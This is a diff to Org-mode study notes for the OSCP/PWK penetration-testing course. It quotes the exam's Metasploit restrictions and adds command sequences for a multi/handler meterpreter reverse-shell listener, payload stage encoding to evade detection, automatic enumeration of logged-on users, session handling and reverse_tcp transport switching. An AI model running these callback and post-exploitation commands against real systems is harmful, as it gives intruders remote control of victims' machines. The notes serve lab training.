@@ -2472,6 +2472,20 @@ In production environments, domains typically have more than one domain controll
 ** Exam Restrictions
    + ref:
      - [[https://help.offensive-security.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide][Metasploit Restrictions]]
+   + quotes:
+     + limited:
+   #+begin_quote
+The usage of Metasploit and the Meterpreter payload are restricted during the exam. You may only use Metasploit modules ( *Auxiliary* , *Exploit* , and *Post* ) or the Meterpreter payload against *one* single target machine of your choice. Once you have selected your one target machine, you cannot use Metasploit modules ( Auxiliary, Exploit, or Post ) or the Meterpreter payload against any other machines.
+   #+end_quote
+     + not-limited:
+     #+begin_quote
+     You may use the following against all of the target machines:
+
+       + multi handler (aka exploit/multi/handler)
+       + msfvenom
+       + pattern_create.rb
+       + pattern_offset.rb
+     #+end_quote
 
 ** Metasploit User Interfaces and Setup
    + ref:
@@ -2540,7 +2554,7 @@ In production environments, domains typically have more than one domain controll
       msf5 > search type:auxiliary name:smb
       #+end_src
       - use
-      #+begin_src
+      #+begin_src msf
       msf5 > use scanner/smb/smb2
       msf5 auxiliary(scanner/smb/smb2) > info
       msf5 auxiliary(scanner/smb/smb2) > [show] options
@@ -2559,9 +2573,9 @@ In production environments, domains typically have more than one domain controll
 
 ** Exploit Modules
 
-*** SincBreeze Enterprise
+*** SyncBreeze Enterprise
     + src:
-    #+begin_src
+    #+begin_src msf
     msf5 > search syncbreeze
       ## List of matching modules
     msf5 > info exploit/windows/http/syncbreeze_bof
@@ -2673,10 +2687,64 @@ msf5 payload(windows/shell_reverse_tcp) > generate -f exe -e x86/shikata_ga_nai 
      + ref:
        - [[./ref/ISC2014-AttackCodeExtraction-final.pdf][obfuscation encode techniques (archived)]]
       
-*** Metasploit Exploit Multi Handler (PWK p698) (msf multi/handler module)
+*** TODO (important) Metasploit Exploit Multi Handler (PWK p698) (msf multi/handler module)
     + info:
       - the msf *multi/handler* module could handle all msf payloads callback.
-
+    + src:
+    #+begin_src msf
+    msf5 > use multi/handler
+    msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_https
+    msf5 exploit(multi/handler) > show options
+    msf5 exploit(multi/handler) > set LHOST 10.11.0.4
+    msf5 exploit(multi/handler) > set LPORT 443
+    msf5 exploit(multi/handler) > run -j
+      # run in background
+    msf5 exploit(multi/handler) > jobs
+      # view running background jobs
+    msf5 exploit(multi/handler) > jobs -i 0
+      # show jobs info of the job0
+    msf5 exploit(multi/handler) > kill 0
+    (PWK p699)
+    #+end_src
+    + TODO use multi-handler with staged non-meterpreter payloads
+    
+*** ? Client-Side Attacks (? msfvenom: more formats)
+    + src:
+    #+begin_src sh
+msfvenom -l formats
+  # list available formats
+    #+end_src
+    + TODO list available formats for the particular payload
+    
+*** Advanced Features and Transports (e.g. stage encoding)
+    + src:
+    #+begin_src msf
+msf5 exploit(multi/handler) > show advanced
+  # EnableContextEncoding   false            no        Use transient context when encoding payloads
+msf5 exploit(multi/handler) > set payload /windows/meterpreter/reverse_http
+  # set StageEncoder x86/shikata_ga_nai
+msf5 exploit(multi/handler) > run -j
+msf5 exploit(multi/handler) > set AutoRunScript windows/gather/enum_logged_on_users
+  # enumerate logged-in user automatically
+    #+end_src
+    
+**** session management
+     + src:
+     #+begin_src msf
+meterpreter > background
+msf5 exploit(multi/handler) > sessions -l
+  # -l        List all active sessions
+msf5 exploit(multi/handler) > sessions -i 5
+  # -i <opt>  Interact with the supplied session ID
+     #+end_src
+     
+**** protocol transport (e.g. TCP to HTTPs after compromise)
+     + src:
+     #+begin_src meterpreter
+meterpreter > transport list
+meterpreter > transport add -t reverse_tcp -l 10.11.0.4 -p 5555
+     #+end_src
+    
 
 * TODO list
   + AD, LDAP enum users
